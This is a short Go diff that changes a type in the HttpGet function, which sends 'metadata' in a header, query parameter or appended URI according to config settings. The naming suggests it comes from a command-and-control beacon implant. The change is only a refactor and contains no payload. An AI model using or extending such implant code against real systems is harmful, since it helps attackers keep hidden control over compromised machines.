@@ -79,18 +79,18 @@ func HttpPost(Url string, data []byte, cryptTypes []string, id []byte) ([]byte, 
 
 	return nil, nil
 }
-func HttpGet(Url string, data string, cryptTypes []string) ([]byte, error) {
+func HttpGet(Url string, data []byte, cryptTypes []string) ([]byte, error) {
 	//metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
 	var resp *req.Resp
 	var err error
 	for {
 		if config.Http_get_metadata_type == "header" {
-			metaData := req.Header{config.Http_get_metadata_type_value: config.Http_get_metadata_prepend + data}
+			metaData := req.Header{config.Http_get_metadata_type_value: config.Http_get_metadata_prepend + string(data)}
 			resp, err = httpRequest.Get(Url, config.HttpHeaders, metaData)
 		} else if config.Http_get_metadata_type == "parameter" {
-			resp, err = httpRequest.Get(Url+"?"+config.Http_get_metadata_type_value+"="+url.QueryEscape(data), config.HttpHeaders)
+			resp, err = httpRequest.Get(Url+"?"+config.Http_get_metadata_type_value+"="+url.QueryEscape(string(data)), config.HttpHeaders)
 		} else if config.Http_get_metadata_type == "uri-append" {
-			resp, err = httpRequest.Get(Url+url.QueryEscape(config.Http_get_metadata_prepend+data), config.HttpHeaders)
+			resp, err = httpRequest.Get(Url+url.QueryEscape(config.Http_get_metadata_prepend+string(data)), config.HttpHeaders)
 		} else {
 			return nil, errors.New("This type is not supported now for metadata")
 		}
